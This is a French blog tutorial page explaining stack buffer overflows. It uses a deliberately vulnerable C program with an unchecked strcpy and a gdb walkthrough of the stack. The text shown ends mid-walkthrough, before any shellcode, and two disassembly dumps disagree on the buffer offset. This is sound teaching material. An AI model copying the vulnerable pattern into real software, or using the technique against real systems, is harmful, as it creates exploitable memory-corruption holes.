<!doctype html>
<html lang="fr-fr" class="no-js">

  <head>
    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  
    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
    <!-- Enable responsiveness on mobile devices-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  
    <title>
      
        Buffer Overflow - hackndo
      
    </title>

	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
    
    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
    <link rel="manifest" href="/assets/res/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
  	
	<!-- RSS -->
    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="hackndo" />

    <!-- Twitter card -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@hackanddo" />
    <meta name="twitter:creator" content="@hackanddo" />
    <meta name="twitter:title" content="Buffer Overflow" />
    <meta name="twitter:description" content="Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d'exploitation dans ce tuto" />
    
    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2015/03/groot.jpg" />
    
  
    <!-- Google analytics -->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  
      ga('create', 'UA-80312745-1', 'auto');
      ga('send', 'pageview');
  
    </script>
    <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="Buffer Overflow" />
<meta name="author" content="Pixis" />
<meta property="og:locale" content="fr_FR" />
<meta name="description" content="Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d’exploitation dans ce tuto" />
<meta property="og:description" content="Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d’exploitation dans ce tuto" />
<link rel="canonical" href="http://localhost:4000/buffer-overflow/" />
<meta property="og:url" content="http://localhost:4000/buffer-overflow/" />
<meta property="og:site_name" content="hackndo" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2015-03-04T00:00:00+01:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/logo.png"},"name":"Pixis"},"url":"http://localhost:4000/buffer-overflow/","headline":"Buffer Overflow","dateModified":"2015-03-04T00:00:00+01:00","datePublished":"2015-03-04T00:00:00+01:00","author":{"@type":"Person","name":"Pixis"},"description":"Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d’exploitation dans ce tuto","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/buffer-overflow/"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

</head>

  <body>
    <header class="cd-main-header">
    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" /> <span class="cd-logo-title">hackndo</span></a>
		
    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>

</header> <!-- .cd-main-header -->
    <main class="cd-main-content">
		<nav class="cd-side-nav">
            <div class="sidebar-about">
    <h1>
        <img id="site-logo" src="/assets/icones/logo.png" alt="logo" title="logo" />
        <a class="sidebar-title" href="/">
        hackndo
        </a>
    </h1>
    <p class="lead">Think out of the box</p>
</div>

<ul>
    <li class="cd-label">Blog</li>
    <li class="">
        <a href="/">Home</a>
    </li>
    
    
        
            
        
    
        
            
                <li class="">
                    <a href="/about/">À propos</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/archives/">Archives</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/contact/">Me contacter</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/disclaimer/">Disclaimer</a>
                </li>
            
        
    
        
    
        
            
        
    
        
            
                <li class="">
                    <a href="/projects/">Projets</a>
                </li>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
    
        
    
</ul>
<ul>
    <li class="cd-label">Liens</li>
    <li><a href="https://www.dailysecurity.fr/" target="_blank">Blog de Geluchat</a></li>
    <li><a href="http://lsdsecdaemon.com" target="_blank">Blog de Th3_l5D</a></li>
    <li><a href="http://inf0sec.fr" target="_blank">Blog de Matthieu</a></li>
</ul>
<p class="sidebar-copyright">&copy; 2019. Tous droits réservés.</p>
<div class="sidebar-social">
<ul>
  <li><a href="https://twitter.com/HackAndDo" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
  <li><a href="https://github.com/hackndo" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
  <li><a href="https://www.youtube.com/channel/UC9WYWHLdu9TK-0Hu3wcHJ9g" title="Youtube" target="_blank"><img title="Youtube" alt="Youtube" src="/assets/icones/social/youtube.png" /></a></li>
  <li><a href="https://discord.gg/9At6SUZ" title="Discord" target="_blank"><img title="Discord" alt="Discord" src="/assets/icones/social/discord.png" /></a></li>
  <li><a href="https://www.linkedin.com/in/romainbentz/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
  <li><a href="https://sh.hackndo.com" title="Shell" target="_blank"><img title="Shell" alt="Shell" src="/assets/icones/social/shell.png" /></a></li>
  <li><a href="/feed.xml" title="RSS" target="_blank"><img title="RSS" alt="RSS" src="/assets/icones/social/rss.png" /></a></li>
  <li><a href="https://ko-fi.com/hackndo" title="Ko-Fi" target="_blank"><img title="Ko-Fi" alt="Ko-Fi" src="/assets/icones/social/kofi.gif" /></a></li>
</ul>
</div>
        </nav>

        <div class="content-wrapper">
            <div class="post">
  
  <div class="post-cover">
    <img src="/assets/uploads/2015/03/groot.jpg" alt="Buffer Overflow" title="Buffer Overflow" />
  </div>
  
  <h1 class="post-title">Buffer Overflow</h1>
  <div class="post-info">
      <p class="alignleft">04 Mar 2015 <a class="post-comments-count" href="http://http://localhost:4000/buffer-overflow/#disqus_thread"></a></p>
      <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Pixis</a></strong></p>
      <div class="keywords">
        <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a></span>
      </div>
</div>

  <article>
  <p>Nous allons ici expliquer ce qui se cache derrière la notion de buffer overflow, avant de donner deux exemples différents d’exploitation dans ce tuto “buffer overflow”:</p>

<ol>
  <li>Cas d’un buffer qui alloue suffisamment d’espace pour contenir un shellcode avant l’adresse de retour sur la pile</li>
  <li>Cas d’un buffer trop petit pour contenir un shellcode avant l’adresse de retour sur la pile</li>
</ol>

<!--more-->

<h2 id="théorie">Théorie</h2>

<p>Nous avons vu l’utilité de la pile (<em>stack</em>) dans les articles précédents. En fin d’article, nous avons évoqué le cas où une fonction avait besoin d’allouer de l’espace sur la pile pour une de ses variables locales, qui était un tableau</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">maFonction</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">uneChaine</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">tableau</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<p>On obtenait alors le schéma suivant pour représenter la stack :</p>

<p><a href="/assets/uploads/2015/03/stack1.png"><img src="/assets/uploads/2015/03/stack1.png" alt="Stack" /></a></p>

<p>Très bien. Maintenant, si nous allouons un tableau de caractères à cette variable locale de la manière suivante</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">maFonction</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">uneChaine</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">tableau</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">tableau</span><span class="p">,</span> <span class="n">uneChaine</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Alors <code class="highlighter-rouge">uneChaine</code> sera copié dans la pile dans l’espace alloué, et ce en partant de l’adresse pointée par <code class="highlighter-rouge">ESP</code> puis en descendant dans la pile (donc des adresses basses vers les adresses hautes, ou encore du haut de la pile vers le bas de la pile). Prenons un exemple d’une chaine remplie de <code class="highlighter-rouge">"A"</code> d’une longueur inférieure à 24 octets :</p>

<p><a href="/assets/uploads/2015/03/stack2.png"><img src="/assets/uploads/2015/03/stack2.png" alt="Stack" /></a></p>

<p>Tout va bien, mais vous vous dites sûrement : Hey, mais si je mets plus de caractères que prévu, il se passe quoi ?</p>

<p><a href="/assets/uploads/2015/03/stack3.png"><img src="/assets/uploads/2015/03/stack3.png" alt="Stack" /></a></p>

<p>C’est le drame… pour le développeur. Mais pour nous, c’est maintenant que nous allons commencer à nous amuser ! Vous avez deviné comment ?</p>

<p>Oui, on a pu écrire sur la valeur de retour que le processeur récupèrera à la fin de la fonction. Dans l’état actuel, à la fin du programme, il va tenter d’aller à l’adresse <code class="highlighter-rouge">AAAA</code> qui, en hexadécimal, est <code class="highlighter-rouge">0x41414141</code>. Il y a de fortes chances pour qu’il n’ait pas le droit d’accéder à cette case mémoire, ou que cette zone mémoire ne soit pas mappée, et vous obtiendrez un joli <code class="highlighter-rouge">SEGFAULT</code>.</p>

<p>Mais cela veut dire que l’on peut écrire la valeur que l’on veut, donc on peut rediriger le fil d’exécution du programme vers un morceau de code que nous aurons préparé. Ce morceau de code peut par exemple ouvrir un shell.</p>

<p>Alors, à vos claviers, et exploitons ceci…</p>

<h2 id="pratique">Pratique</h2>

<p>Comme promis, nous allons nous intéresser à deux cas pratiques.</p>

<h3 id="cas-1">Cas 1</h3>

<p>J’ai illustré un cas similaire en vidéo, vous le <a href="https://www.youtube.com/watch?v=V7Gdc32XRhA" target="blank">trouverez ici</a>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"binary </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">else</span> <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Voici un programme qui prend en entrée un argument (qui sera une string, ou plus précisément un tableau de caractères). Cet argument est passé tel quel à la fonction <code class="highlighter-rouge">func</code>. La fonction <code class="highlighter-rouge">func</code> prévoit alors de la place sur la pile en allouant 64 octets. Cet espace est pointé par le pointeur <code class="highlighter-rouge">buffer</code>. Puis le programme copie le contenu de la chaine de caractère dans ce <code class="highlighter-rouge">buffer</code>, sans aucune vérification sur la taille, et enfin affiche le contenu de <code class="highlighter-rouge">buffer</code>.</p>

<p>Très bien compilons-le et testons le :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hackndo@hackndo:~<span class="nv">$ </span>gcc binary.c <span class="nt">-o</span> binary
  
hackndo@hackndo:~<span class="nv">$ </span>./binary AAA
  
AAA
  
hackndo@hackndo:~<span class="nv">$ </span>./binary <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x200'</span><span class="si">)</span>
  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  
Erreur de segmentation
  
hackndo@hackndo:~<span class="nv">$ </span>
</code></pre></div></div>

<p>Après compilation, nous avons donc lancé notre programme en lui passant dans un premier temps la chaine de caractères <code class="highlighter-rouge">AAA</code>. Le programme nous l’a affichée à l’écran, comme prévu. Dans le second cas, nous avons envoyé 200 fois la lettre <code class="highlighter-rouge">"A"</code>. Le programme nous l’affiche également, mais nous nous retrouvons face à une erreur de segmentation (ou <code class="highlighter-rouge">SEGFAULT</code>). Cela veut dire que nous avons tenté de lire un segment nous n’avions pas le droit de lire (ou écrire quelque part où nous n’avions pas le droit d’écrire).</p>

<p>Tentons de comprendre pourquoi, en suivant pas à pas le fonctionnement du programme lors de son exécution. Voici les instructions assembleur des deux fonctions</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Fonction main</span>
<span class="o">(</span>gdb<span class="o">)</span> disass main
Dump of assembler code <span class="k">for function </span>main:
0x08048419 &lt;+0&gt;:     push   ebp
0x0804841a &lt;+1&gt;:     mov    ebp,esp
0x0804841c &lt;+3&gt;:     and    esp,0xfffffff0
0x0804841f &lt;+6&gt;:     sub    esp,0x10
0x08048422 &lt;+9&gt;:     cmp    DWORD PTR <span class="o">[</span>ebp+0x8],0x2
0x08048426 &lt;+13&gt;:    je     0x8048436 &lt;main+29&gt;
0x08048428 &lt;+15&gt;:    mov    DWORD PTR <span class="o">[</span>esp],0x8048510
0x0804842f &lt;+22&gt;:    call   0x8048330 &lt;puts@plt&gt;
0x08048434 &lt;+27&gt;:    jmp    0x8048446 &lt;main+45&gt;
0x08048436 &lt;+29&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
0x08048439 &lt;+32&gt;:    add    eax,0x4
0x0804843c &lt;+35&gt;:    mov    eax,DWORD PTR <span class="o">[</span>eax]
0x0804843e &lt;+37&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
0x08048441 &lt;+40&gt;:    call   0x80483f4 
0x08048446 &lt;+45&gt;:    mov    eax,0x0
0x0804844b &lt;+50&gt;:    leave
0x0804844c &lt;+51&gt;:    ret
End of assembler dump.

<span class="c"># Fonction func</span>
<span class="o">(</span>gdb<span class="o">)</span> disass func
Dump of assembler code <span class="k">for function </span>func:
0x080483f4 &lt;+0&gt;:     push   ebp
0x080483f5 &lt;+1&gt;:     mov    ebp,esp
0x080483f7 &lt;+3&gt;:     sub    esp,0x58
0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8]
0x080483fd &lt;+9&gt;:     mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
0x08048401 &lt;+13&gt;:    lea    eax,[ebp-0x3a]
0x08048404 &lt;+16&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
0x08048407 &lt;+19&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
0x0804840c &lt;+24&gt;:    lea    eax,[ebp-0x3a]
0x0804840f &lt;+27&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
0x08048412 &lt;+30&gt;:    call   0x8048330 &lt;puts@plt&gt;
0x08048417 &lt;+35&gt;:    leave
0x08048418 &lt;+36&gt;:    ret
End of assembler dump.
</code></pre></div></div>

<p>La première partie de ce code correspond à la fonction <code class="highlighter-rouge">main</code> et la deuxième partie correspond à la fonction <code class="highlighter-rouge">func</code>. L’appel de la fonction <code class="highlighter-rouge">func</code> se fait à l’instruction située à l’adresse <code class="highlighter-rouge">0x08048441</code> de la fonction <code class="highlighter-rouge">main</code>. Lorsque nous rentrons dans <code class="highlighter-rouge">func</code>, la troisième ligne correspond à l’allocation du buffer. <code class="highlighter-rouge">0x58</code> (88 en décimal) octets sont alloués (ce qui est plus que les 64 octets que nous demandons dans le code car il faut tenir compte de l’alignement des variables en mémoire. C’est un sujet dont nous ne discuterons pas ici, il ferait l’objet d’un article complet).</p>

<p>Ensuite, à l’adresse <code class="highlighter-rouge">0x08048407</code> se trouve l’appel système pour copier le contenu de la variable dans le buffer. L’instruction à l’adresse <code class="highlighter-rouge">0x08048412</code> fait l’appel à <code class="highlighter-rouge">puts</code> qui permet d’afficher un tableau de caractère sur la sortie standard, et enfin nous avons l’instruction de retour à l’adresse <code class="highlighter-rouge">0x08048418</code>.</p>

<p>Pour pouvoir suivre l’exécution du code, nous allons placer des breakpoints à des endroits stratégiques pour que je puisse vous faire comprendre le fonctionnement. Vous comprendrez pourquoi ces endroits sont intéressants, puisqu’à chaque breakpoint je vous expliquerai son apport</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span>0x08048441 <span class="c"># Avant func, dans main</span>
Breakpoint 1 at 0x8048441
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span>0x080483f7 <span class="c"># Avant réservation mémoire pour le buffer</span>
Breakpoint 2 at 0x80483f7
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span>0x080483fa <span class="c"># Après réservation mémoire pour le buffer</span>
Breakpoint 3 at 0x80483fa
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span>0x0804840c <span class="c"># Après copie de la variale dans le buffer</span>
Breakpoint 4 at 0x804840c
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span>0x08048418 <span class="c"># Avant la sortie de la fonction</span>
Breakpoint 5 at 0x8048418
</code></pre></div></div>

<ul>
  <li>Le <strong>premier</strong> breakpoint est placé juste avant l’appel de la fonction <code class="highlighter-rouge">func</code> dans <code class="highlighter-rouge">main</code>. Nous pourrons ainsi regarder comment est fait cet appel notamment comment est empilée l’argument que nous passons au programme.</li>
  <li>Le <strong>deuxième</strong> est placé avant la réservation de la mémoire pour le buffer. Nous verrons ici comment la fonction <code class="highlighter-rouge">func</code> prépare son stackframe en enregistrant l’ancienne valeur de EBP, et en l’initialisant pour son propre stackframe.</li>
  <li>Le <strong>troisème</strong> est placé juste après cette réservation de mémoire, afin de voir comment le processeur réserve de l’espace mémoire pour le buffer.</li>
  <li>Le <strong>quatrième</strong> est placé après avoir copié la variable dans le buffer, permettant d’observer comment le buffer se rempli avec l’argument que nous lui avons passé, suite à la fonction strcpy.</li>
  <li>Le <strong>cinquième</strong> est placé avant de sortir de la fonction, pour qu’on puisse voir que le printf n’a pas de problème pour afficher la chaine de caractères.</li>
</ul>

<p>C’est parti, il est temps d’exécuter le code. Pour cela, je vais envoyer un argument de longueur 78. Il y a une bonne raison, et vous allez la comprendre au fil de cet exemple.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x78'</span><span class="sb">`</span>
Starting program: /tmp/hackndo/binary <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x78'</span><span class="sb">`</span>
Breakpoint 1, 0x08048441 <span class="k">in </span>main <span class="o">()</span>

<span class="o">(</span>gdb<span class="o">)</span> disass main
Dump of assembler code <span class="k">for function </span>main:
   0x08048419 &lt;+0&gt;:     push   ebp
   0x0804841a &lt;+1&gt;:     mov    ebp,esp
   0x0804841c &lt;+3&gt;:     and    esp,0xfffffff0
   0x0804841f &lt;+6&gt;:     sub    esp,0x10
   0x08048422 &lt;+9&gt;:     cmp    DWORD PTR <span class="o">[</span>ebp+0x8],0x2
   0x08048426 &lt;+13&gt;:    je     0x8048436 &lt;main+29&gt;
   0x08048428 &lt;+15&gt;:    mov    DWORD PTR <span class="o">[</span>esp],0x8048510
   0x0804842f &lt;+22&gt;:    call   0x8048330 &lt;puts@plt&gt;
   0x08048434 &lt;+27&gt;:    jmp    0x8048446 &lt;main+45&gt;
   0x08048436 &lt;+29&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x08048439 &lt;+32&gt;:    add    eax,0x4
   0x0804843c &lt;+35&gt;:    mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x0804843e &lt;+37&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
<span class="o">=&gt;</span> 0x08048441 &lt;+40&gt;:    call   0x80483f4 
   0x08048446 &lt;+45&gt;:    mov    eax,0x0
   0x0804844b &lt;+50&gt;:    leave
   0x0804844c &lt;+51&gt;:    ret
End of assembler dump.

<span class="c"># On affiche l'état des trois registres</span>
<span class="o">(</span>gdb<span class="o">)</span> i r <span class="nv">$eip</span> <span class="nv">$esp</span> <span class="nv">$ebp</span>
eip            0x8048441     0x8048441 &lt;main+40&gt;
esp            0xbffffc50    0xbffffc50
ebp            0xbffffc68    0xbffffc68

<span class="c"># On examine la valeur contenue par ESP</span>
<span class="o">(</span>gdb<span class="o">)</span> x/xw <span class="nv">$esp</span>
0xbffffc50:    0xbffffe35

<span class="c"># On examine le contenu de ESP</span>
<span class="o">(</span>gdb<span class="o">)</span> x/s 0xbffffe35
0xbffffe35:     <span class="s1">'A'</span>
</code></pre></div></div>

<p>Très bien, nous voyons où nous en sommes grâce à la commande <code class="highlighter-rouge">disass main</code>. Nous sommes donc juste avant l’appel que <code class="highlighter-rouge">main</code> fait à <code class="highlighter-rouge">func</code>. Donc en toute logique, l’élément qui est sur le dessus de la pile devrait être le pointeur vers la chaine de caractère que nous avons passée en argument.</p>

<p>En affichant les différents registres qui nous intéressent par la commande abrégée <code class="highlighter-rouge">info registers</code>, nous pouvons voir que le sommet de la pile se trouve à l’adresse pointée par <code class="highlighter-rouge">ESP</code>, c’est à dire <code class="highlighter-rouge">0xbffffc50</code>.</p>

<p>Si nous regardons l’adresse qui est ici, avec la commande <code class="highlighter-rouge">x/xw $esp</code>, nous obtenons l’adresse qui pointe vers notre chaine de caractères, <code class="highlighter-rouge">0xbffffe35</code>. Et effectivement, lorsqu’on affiche la String située à cette adresse mémoire, gdb nous renvoie que c’est une répétition de 78 fois le caractère <code class="highlighter-rouge">"A"</code>.</p>

<p>Ayant placé le breakpoint sur l’instruction à l’adresse <code class="highlighter-rouge">0x08048441</code>, elle n’a pas encore été exécutée, mais ça sera la prochaine, ce qui explique pourquoi <code class="highlighter-rouge">EIP</code> a pour valeur cette adresse.</p>

<p>Enfin, nous voyons que le début du stackframe de la fonction <code class="highlighter-rouge">main</code> est situé à l’adresse contenue dans <code class="highlighter-rouge">EBP</code>, c’est à dire <code class="highlighter-rouge">0xbffffc68</code>.</p>

<p>Ok, tout est bon, on passe à la suite !</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue
</span>Continuing.
Breakpoint 2, 0x080483f7 <span class="k">in </span>func <span class="o">()</span>

<span class="o">(</span>gdb<span class="o">)</span> disass func
Dump of assembler code <span class="k">for function </span>func:
   0x080483f4 &lt;+0&gt;:     push   ebp
   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
<span class="o">=&gt;</span> 0x080483f7 &lt;+3&gt;:     sub    esp,0x58
   0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8]
   0x080483fd &lt;+9&gt;:     mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048401 &lt;+13&gt;:    lea    eax,[ebp-0x48]
   0x08048404 &lt;+16&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048407 &lt;+19&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
   0x0804840c &lt;+24&gt;:    lea    eax,[ebp-0x48]
   0x0804840f &lt;+27&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048412 &lt;+30&gt;:    call   0x8048330 &lt;puts@plt&gt;
   0x08048417 &lt;+35&gt;:    leave
   0x08048418 &lt;+36&gt;:    ret
End of assembler dump.

<span class="o">(</span>gdb<span class="o">)</span> i r <span class="nv">$eip</span> <span class="nv">$esp</span> <span class="nv">$ebp</span>
eip            0x80483f7    0x80483f7 &lt;func+3&gt;
esp            0xbffffc48    0xbffffc48
ebp            0xbffffc48    0xbffffc48

<span class="o">(</span>gdb<span class="o">)</span> x/4xw <span class="nv">$esp</span>
0xbffffc48:    0xbffffc68    0x08048446    0xbffffe35    0xb7ff1380
</code></pre></div></div>

<p>Encore une fois, nous pouvons voir où nous en sommes dans l’exécution du programme. Si vous suivez, vous devriez deviner ce qu’il y a au sommet de la pile, et le rôle de la prochaine instruction à être exécutée.</p>

<p>Comme nous sommes entrés dans la fonction, le processeur a enregistré le registre <code class="highlighter-rouge">EIP</code> qui étaient en cours au moment de l’appel, c’est à dire l’adresse <code class="highlighter-rouge">0x08048446</code>.</p>

<p>Ensuite, le début de la fonction voulant avoir son propre stack frame enregistre le début du stack frame de la fonction appelante, à l’aide de l’instruction <code class="highlighter-rouge">push ebp</code> puis il initialise le début de son stack frame en copiant la valeur de <code class="highlighter-rouge">ESP</code> dans <code class="highlighter-rouge">EBP</code> (<code class="highlighter-rouge">mov ebp,esp</code>).</p>

<p>J’ai affiché les valeurs des trois registres, et lorsqu’on affiche les 4 valeurs qui sont au sommet de la stack, on retrouve sans surprise la dernière valeur ajoutée qui est l’ancienne valeur de <code class="highlighter-rouge">EBP</code> (que nous avions trouvée avant l’appel de la fonction, c’était la base du stack frame de la fonction <code class="highlighter-rouge">main</code>), suivie de la sauvegarde de <code class="highlighter-rouge">EIP</code>, adresse de l’instruction qui suit le <code class="highlighter-rouge">call</code> vers la fonction <code class="highlighter-rouge">func</code>.</p>

<p>À la suite !</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue
</span>Continuing.
Breakpoint 3, 0x080483fa <span class="k">in </span>func <span class="o">()</span>

<span class="o">(</span>gdb<span class="o">)</span> disass func
Dump of assembler code <span class="k">for function </span>func:
   0x080483f4 &lt;+0&gt;:     push   ebp
   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
   0x080483f7 &lt;+3&gt;:     sub    esp,0x58
<span class="o">=&gt;</span> 0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8]
   0x080483fd &lt;+9&gt;:     mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048401 &lt;+13&gt;:    lea    eax,[ebp-0x48]
   0x08048404 &lt;+16&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048407 &lt;+19&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
   0x0804840c &lt;+24&gt;:    lea    eax,[ebp-0x48]
   0x0804840f &lt;+27&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048412 &lt;+30&gt;:    call   0x8048330 &lt;puts@plt&gt;
   0x08048417 &lt;+35&gt;:    leave
   0x08048418 &lt;+36&gt;:    ret
End of assembler dump.

